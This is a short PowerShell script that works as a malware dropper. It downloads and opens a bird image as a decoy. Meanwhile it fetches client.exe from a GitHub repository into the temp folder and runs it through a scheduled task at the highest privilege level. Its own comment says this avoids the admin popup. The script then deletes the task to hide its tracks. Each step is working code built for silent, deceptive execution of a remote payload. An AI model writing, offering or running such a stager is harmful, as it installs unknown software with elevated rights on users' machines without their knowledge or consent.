# Download the image #
Invoke-WebRequest -Uri "https://png.pngtree.com/png-vector/20191121/ourmid/pngtree-blue-bird-vector-or-color-illustration-png-image_2013004.jpg" -OutFile "$env:TEMP\blue-bird.jpg"

# Open the downloaded image
Start-Process "$env:TEMP\blue-bird.jpg"

# Download the client.exe file
$exeUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/client.exe"
$exePath = "$env:TEMP\client.exe"
Invoke-WebRequest -Uri $exeUrl -OutFile $exePath

# Run the downloaded client.exe with elevated privileges (no admin popup)
$taskName = "RunClientExeTask"
$action = New-ScheduledTaskAction -Execute $exePath
$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
Register-ScheduledTask -TaskName $taskName -Action $action -Principal $principal -Settings $settings -Force
Start-ScheduledTask -TaskName $taskName

# Wait for the task to complete and then clean up
Start-Sleep -Seconds 5
Unregister-ScheduledTask -TaskName $taskName -Confirm:$false